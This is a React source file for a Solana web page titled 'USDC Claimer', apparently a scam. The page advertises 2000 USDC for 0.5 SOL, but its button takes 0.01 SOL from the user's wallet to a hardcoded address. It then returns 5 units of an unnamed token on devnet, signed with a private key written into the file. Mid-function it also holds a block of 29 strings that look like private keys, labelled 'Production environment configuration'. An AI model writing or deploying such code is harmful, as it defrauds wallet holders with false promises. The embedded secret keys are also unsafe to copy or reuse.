/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "qkfNvRLPgusst7rGZ2MEZVNZMgHRMeo9J35pNoW3bQEZcJLnhMN5xES1N4HETTBPGbofzVWSYpjc9MBeNPt3mxU"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4DhS5GD5J3AHgNvHEtPkzGDoKvW92u2ucUYvgHwgZFbNB8XTcWAWNfN28whG5825JduyJiPY5QSHQi9WegkyVKdc",
  "key1": "3vuqWKr7qyQKkHX6q4bGtkncNmT4ivziXQeM8E4mknVZ18sgbF7eZKk85no6tiU4BD57xjCuZHW9PpnQUobgaaMg",
  "key2": "2Ce5VAgVUcYmBmbmGxzWYutrmKwbfHj33shNaGveG85dzkuRdrFH1HQRU23Y1uAxzsHSgJuYvqyZ7Lyae1gojocd",
  "key3": "2Mp1RzhcWqcSzT6dQj3f2urb4ESgkKGFB5tGHjRKKZudct9E23setJk25WJGP7owqsGtLjMiMXxpinNs3eucQvw8",
  "key4": "3HJR5bN3Tj4fuuMMxLveDTpXZJ8emAmpKoYVVUYtJ5MpgoEkGq6pFRKTARshqGmCWq3mmiQcVN5ESrfuDgyM8vqV",
  "key5": "42YE9eL2Kn4k8oZxWuoShDBbKp9296RcLzjHpRCsiCLyk5U4So4Hauz5RvvUiXEdiykJmZ45Af19bAKpU6ESf618",
  "key6": "2mVy3vLZmDpGZcbGYuGzHEG2JtoCf99NwQcJLonXgUfM5EbdUy4S9Ky7i8LFUGT6ifCekierLE2hHqrtc816apmU",
  "key7": "4vXnRXq1yVxP4S4ThecYcGWpoczSYC2mVRhKfqWUHbxwRF8vgibCQLg6WoRaHYBghKwAw8g2gEpqhZyJhdEPw33z",
  "key8": "4KZqfmyJLgxRVx3huN53obUcKyNMMRf4wJpd8qyrxxqkPaiwboPKBH92csvLDBT9gVqsUyHDxSQaCteW9XwYjBDy",
  "key9": "P14XXBfYHKTpL2PXhPFkPKn71Tuk1ighnHpqSCqdrwrGWzLgfec3Q7U84F1FAoDPmMUkuewj2T7MNCf9NBSr3tx",
  "key10": "3q8otZ6cGDGcdnhppJjjDwMkAdvpF2J9HnePSTaREeF8nsAdBu1mNyDPe14youmnP9Vpjx7ukeUZ7p7vQrBss5L",
  "key11": "4kuGnKVRLWUafr4SRShGvFt8c5Ypmd4UUU8jU8bFgZ7FaPGJxyEa74hV5PtQUc3Sa2QGGio4dZdg8EUrZDpowZPv",
  "key12": "4z7vhJbKtEF7p6KJ4Ky2M1yAcT4Du7aY7d9cmWnAzEBkCj3vszSuggGGVK7LQwcJRAJ44dBFv83omG6EPRBiSE9L",
  "key13": "3RaGGHWRXqSmNG2T9bN49iCScnKF7PsMXWQLUmSjiCiigfUDanGecHRUbu3uw6agwRrkRxeF23X6b2437wYy2aJS",
  "key14": "EXDds4vRnUssR38L6yXnHhMr1otW1WTNWpq848HkvqGmRLkAhnpQBTrGiCHTDa5kGND8shAR3V2R6RwzUQ8iQuh",
  "key15": "34JEvavdrVJZGsjGNAS8Y75gqCVW76e7PexJaLVM22BJBxV7HprLzfFqaDgcsB6caWCuFC5RNPEkHZ5LZj1jio71",
  "key16": "3iPeimhknbvYoLoYPdgavGGd4a3joegejaADeYUP16W7Lpd1penGn15xvzoqesL4V4XWKTwgfmq5fT8wqk2uzUqc",
  "key17": "9MWRsRcR8hkQzvQEmzuKS48tMjT1aeoBdwwL6iYFXE3x4qgJK6uLEkUw6mzd19fQdDgeXR8eTDaNzNYyX45AMFd",
  "key18": "2eoxV2ukagN1w4KbHDhwFxU2AczivNc7Bt42ZvV6rGUhNoiuaf64QjARGeRESg2ye9qx81bqPBtAHmk7JFus5Uq",
  "key19": "t7be5yrDSukj1NwWNWuutB2z4tkL1eP8Um3Gkn3XBcrifEULtuvEoYeCD76dkNWud6cG2ozKKQ6j8hJArNebuus",
  "key20": "3eAYwdvNeogdxE94ibRQTv3N2VwEF7yrupD8x9tns8mpHUkVTHoYmAXyHTigN393VnSYrAgrhC1x15NRg856irqS",
  "key21": "2RzrqGW4gXtwTWU5Mt77hdSZ4kd2wZKEYCFmxwgtRuacQiEf1BLLddGzzPXAv869HLxKhAJA4A5QjJxKtPa9sxy3",
  "key22": "43iiiSGvr1zcVLvgrb5TYx5fUKnepgkRxA7kVDe11YxBV7zVK5BYWia39buSKTNXyGoVQhcQryrvuXt92uAEtTin",
  "key23": "4x6RAYGVgsPHZYukJFoNwaSJwZQHj8WmrnsYfPCZH1AEaX5ac79eSJstBiMnxrwYnviWJYV8tSJvkBYps5HkJYgw",
  "key24": "x9hFPLAnTsW6rV62HbpUhgX2SzP7wF6SytYLY6Mmo9SS1HkjwoGJzHZ97vaotud2kvkL7E48tdmDqmqMDrCMkfV",
  "key25": "2UJQ6hRV8M4TYfQxwYbTEz5UHoZhZM64e1Cnt8mXRF3SDg5zmgEU461mLhDhvyvaTcYMJNuWnP9afMw1XeMYN6MT",
  "key26": "4EBtmyYePhaazR5avoyX5YmvG3cSmCxBvGQLKF8LcZNQgcAsMB8Wf27UnNpxECVRreJGxPe9HpDnHPikqurnNpqb",
  "key27": "4bnsA9yB6d3wi3a9bhB974mAp9pEi1bR5M6D2ddPE1XGVAmGDgHzCWb7N3UhFZ63BjuDDDCDBk3uNhCqFVT5yBpa",
  "key28": "WfWvQJGt9xfb2AnynPBt45tiE1TYiYhHrFAgVG6kA44QKcqa47hu6M7Wyuti4W2MVu1BwE3DtStiuhiipEta3CE"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
